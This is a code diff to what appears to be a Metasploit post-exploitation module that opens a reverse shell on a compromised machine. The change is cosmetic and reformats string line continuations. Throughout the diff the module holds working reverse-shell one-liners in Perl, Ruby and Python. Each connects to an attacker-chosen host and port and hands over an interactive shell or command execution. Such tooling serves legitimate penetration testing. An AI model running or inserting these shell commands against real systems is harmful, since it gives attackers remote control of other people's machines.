@@ -43,8 +43,8 @@ class Metasploit3 < Msf::Post
 					[false, 'Port for Payload to connect to.', 4433]),
 				OptBool.new('HANDLER',
 					[ true, 'Start an Exploit Multi Handler to receive the connection', false]),
-				OptEnum.new('TYPE', [true, 'Scripting environment on target to use for reverse shell',\
-						  'auto', ['auto','ruby','python','perl','bash']])
+				OptEnum.new('TYPE', [true, 'Scripting environment on target to use for reverse shell',
+					'auto', ['auto','ruby','python','perl','bash']])
 			], self.class)
 	end
 
@@ -55,7 +55,7 @@ class Metasploit3 < Msf::Post
 		lport = datastore['LPORT']
 		cmd = ""
 		case datastore['type']
-		when /auto/i 
+		when /auto/i
 			cmd = auto_create_session(lhost,lport)
 		when /ruby/i
 			cmd = ruby_session(lhost,lport)
@@ -153,8 +153,8 @@ class Metasploit3 < Msf::Post
 	def perl_session(lhost,lport)
 		if cmd_exec("perl -v") =~ /Larry/
 			print_status("Perl reverse shell selected")
-			cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET \
-(PeerAddr,\"#{lhost}:#{lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+			cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET " +
+				"(PeerAddr,\"#{lhost}:#{lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 		else
 			print_error("No scripting environment found for the selected type.")
 			cmd =""
@@ -166,8 +166,8 @@ class Metasploit3 < Msf::Post
 	def ruby_session(lhost,lport)
 		if cmd_exec("ruby -v") =~ /revision/i
 			print_status("Ruby reverse shell selected")
-			return "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{lport}\");\
-while(cmd=c.gets);begin;IO.popen(cmd,\"r\"){|io|c.print io.read};rescue;end;end'"
+			return "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{lport}\");" +
+				"while(cmd=c.gets);begin;IO.popen(cmd,\"r\"){|io|c.print io.read};rescue;end;end'"
 		else
 			print_error("No scripting environment found for the selected type.")
 			cmd =""
@@ -179,9 +179,9 @@ while(cmd=c.gets);begin;IO.popen(cmd,\"r\"){|io|c.print io.read};rescue;end;end'
 	def python_session(lhost,lport)
 		if cmd_exec("python -V") =~ /Python 2\.(\d)/
 			print_status("Python reverse shell selected")
-			return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,\
-socket.SOCK_STREAM);s.connect((\"#{lhost}\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
-os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+			return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET," +
+				"socket.SOCK_STREAM);s.connect((\"#{lhost}\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);" +
+				"os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 		else
 			print_error("No scripting environment found for the selected type.")
 			cmd =""
